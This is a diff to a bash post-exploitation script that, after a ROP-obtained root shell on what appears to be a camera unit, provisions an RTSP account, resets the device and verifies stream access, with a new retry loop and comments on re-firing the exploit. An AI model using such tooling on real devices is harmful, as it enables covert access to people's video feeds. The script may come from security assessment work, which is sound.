@@ -13,6 +13,10 @@
 #
 # The RTSP account is the FSS ingest credential: e2e_capture_rtsp.sh consumes the printed pair.
 #
+# The soft reset reboots the unit, so the repeatable ROP shell dies with it and the stack address
+# (per-boot) is stale: getting root back after this point needs a fresh presence + FORCE=1 fire and
+# a re-derive, not a ROP replay. That is why the reset is last.
+#
 #   c460_postshell.sh <host> [--skip-rtsp]
 #
 # Artifacts: /tmp/pane1/<host>/ (recon.txt, bin_main, proc_mtd, chain.*, rtsp_cred.txt, chain.log)
@@ -88,8 +92,28 @@ umask 022
 "$POST_TOOL" "$HOST" --rtsp-enable --rtsp-user fssuser --rtsp-pass "$PASS" \
   --rtsp-reset 2>&1 | tee -a "$LOG" || die "RTSP provisioning was not accepted" 6
 log "config accepted; soft reset sent — waiting for the unit to return"
-"$POST_TOOL" "$HOST" --rtsp-verify --rtsp-user fssuser --rtsp-pass "$PASS" \
-  --wait "${RTSP_WAIT:-10}" 2>&1 | tee -a "$LOG" || die "554 does not serve with the account" 6
+
+# The unit is rebooting: presence says it is back, not that 554 is already bound. But "config
+# accepted" is still not a listener, so the probe is retried a bounded number of times and only the
+# FINAL verdict decides. The first attempt carries the presence wait; later ones do not block on it.
+TRIES="${RTSP_PROBE_TRIES:-6}"
+GAP="${RTSP_PROBE_GAP:-5}"
+rc=1
+for i in $(seq 1 "$TRIES"); do
+  if [ "$i" = 1 ]; then
+    "$POST_TOOL" "$HOST" --rtsp-verify --rtsp-user fssuser --rtsp-pass "$PASS" \
+      --wait "${RTSP_WAIT:-10}" 2>&1 | tee -a "$LOG"
+  else
+    "$POST_TOOL" "$HOST" --rtsp-verify --rtsp-user fssuser --rtsp-pass "$PASS" 2>&1 | tee -a "$LOG"
+  fi
+  rc=${PIPESTATUS[0]}
+  [ "$rc" = 0 ] && break
+  if [ "$i" -lt "$TRIES" ]; then
+    log "554 not serving yet (attempt $i/$TRIES) — retrying in ${GAP}s"
+    sleep "$GAP"
+  fi
+done
+[ "$rc" = 0 ] || die "554 does not serve with the account after $TRIES attempts" 6
 
 log "ENDSTATE reached — account in $OUT/rtsp_cred.txt"
 log "next: deliverables/scripts/e2e_capture_rtsp.sh $HOST fssuser '<pass>'"
